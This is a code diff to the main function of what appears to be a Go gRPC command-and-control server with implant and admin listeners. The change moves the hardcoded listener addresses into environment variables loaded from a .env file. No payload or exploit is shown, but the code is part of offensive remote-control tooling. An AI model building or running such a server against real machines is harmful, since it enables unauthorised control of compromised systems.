@@ -5,8 +5,10 @@ import (
 	"fmt"
 	"log"
 	"net"
+	"os"
 
 	"github.com/Galionme/hercules/grpcapi"
+	"github.com/joho/godotenv"
 	"golang.org/x/net/context"
 	"google.golang.org/grpc"
 )
@@ -61,7 +63,6 @@ func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*gr
 }
 
 func main() {
-
 	var (
 		implantListener, adminListener net.Listener
 		err                            error
@@ -69,15 +70,20 @@ func main() {
 		work, output                   chan *grpcapi.Command
 	)
 
+	err = godotenv.Load()
+	if err != nil {
+		log.Fatal(err)
+	}
+
 	work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
 
 	implant := NewImplantServer(work, output)
 	admin := NewAdminServer(work, output)
 
-	if implantListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 4444)); err != nil {
+	if implantListener, err = net.Listen("tcp", fmt.Sprintf("%s:%s", os.Getenv("IMPLANT_HOST"), os.Getenv("IMPLANT_PORT"))); err != nil {
 		log.Fatal(err)
 	}
-	if adminListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 9090)); err != nil {
+	if adminListener, err = net.Listen("tcp", fmt.Sprintf("%s:%s", os.Getenv("ADMIN_HOST"), os.Getenv("ADMIN_PORT"))); err != nil {
 		log.Fatal(err)
 	}
 
